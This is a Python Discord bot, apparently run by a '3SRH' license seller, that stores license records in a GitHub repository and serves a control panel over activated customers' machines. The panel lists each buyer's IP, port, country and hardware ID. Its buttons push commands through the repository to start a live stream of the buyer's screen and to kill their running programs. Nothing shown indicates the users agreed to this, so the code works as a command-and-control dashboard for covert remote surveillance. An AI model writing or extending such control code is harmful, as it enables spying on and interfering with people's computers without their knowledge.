import os
import base64
import json
import random
import string
import time
import asyncio
import discord
from discord import app_commands
import requests
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))

class LicenseBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()

    async def on_ready(self):
        print(f"Logged in as {self.user}")

client = LicenseBot()

def generate_random_code():
    chars = string.ascii_uppercase + string.digits
    return f"3SRH-{''.join(random.choices(chars, k=5))}"

def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers, timeout=5)
    if r.status_code == 200:
        file_data = r.json()
        db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
        return db, file_data["sha"], url, headers
    return None, None, url, headers

def save_db(db, sha, url, headers, commit_message):
    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
    update_data = {"message": commit_message, "content": new_content, "sha": sha}
    r = requests.put(url, headers=headers, json=update_data, timeout=5)
    return r.status_code in [200, 201]

class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices_list):
        super().__init__(timeout=180)
        for code, info in devices_list[:25]:
            self.add_item(DeviceManageButton(code, info))

class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        ip = info.get("ip", "Unknown")
        port = info.get("port", "8888")
        super().__init__(label=f"🌐 {ip}:{port} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

    async def callback(self, interaction: discord.Interaction):
        ip = self.info.get('ip', 'Unknown')
        port = self.info.get('port', '8888')
        view = DeviceActionsView(self.code, self.info.get("device"), ip, port)
        await interaction.response.send_message(
            f"⚙️ **لوحة التحكم المطلق بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP والـ Port: `{ip}:{port}`\n🌍 الدولة: `{self.info.get('country')}`\n🔒 HWID: `{self.info.get('device')}`", 
            view=view, 
            ephemeral=True
        )

class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid, ip, port):
        super().__init__(timeout=60)
        self.code = code
        self.hwid = hwid
        self.ip = ip
        self.port = port

    @discord.ui.button(label="🔴 بدء البث الحي للشاشة", style=discord.ButtonStyle.danger, custom_id="dev_act_live", row=0)
    async def live_stream_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_live_stream" not in db: db["remote_live_stream"] = {}
            db["remote_live_stream"][self.code] = {"id": str(int(time.time())), "port": self.port}
            if save_db(db, sha, url, headers, f"Start live stream for {self.code}"):
                await interaction.followup.send(f"🔴 **رابط البث الحي المباشر:**\n`http://{self.ip}:{self.port}/stream`", ephemeral=True)

    @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=1)
    async def kill_proc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_killers" not in db: db["remote_killers"] = {}
            db["remote_killers"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Kill background for {self.code}"):
                await interaction.followup.send("🪟 تم إرسال أمر إغلاق الخلفية والألعاب للعميل بنجاح!", ephemeral=True)

class MainDashboardView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
    async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        try:
            db, _, _, _ = fetch_db()
            if not db:
                await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
                return
            devices_list = [(code, info) for code, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
            if not devices_list:
                await interaction.followup.send("🟢 لا توجد أي أجهزة متصلة حالياً.", ephemeral=True)
                return
            view = DevicesSubMenuView(devices_list)
            await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ خطأ: {str(e)}", ephemeral=True)

@client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    db, _, _, _ = fetch_db()
    if not db: return
    codes = db.get("codes", {})
    embed = discord.Embed(title="📊 لوحة التحكم الشاملة", color=0xA871FF)
    embed.add_field(name="📌 الإجمالي", value=f"`{len(codes)}`", inline=True)
    await interaction.response.send_message(embed=embed, view=MainDashboardView(), ephemeral=True)

@client.tree.command(name="sync", description="مزامنة الأوامر")
async def sync_commands(interaction: discord.Interaction):
    await client.tree.sync()
    await interaction.response.send_message("✅ تم مزامنة الأوامر!", ephemeral=True)

if TOKEN:
    client.run(TOKEN)
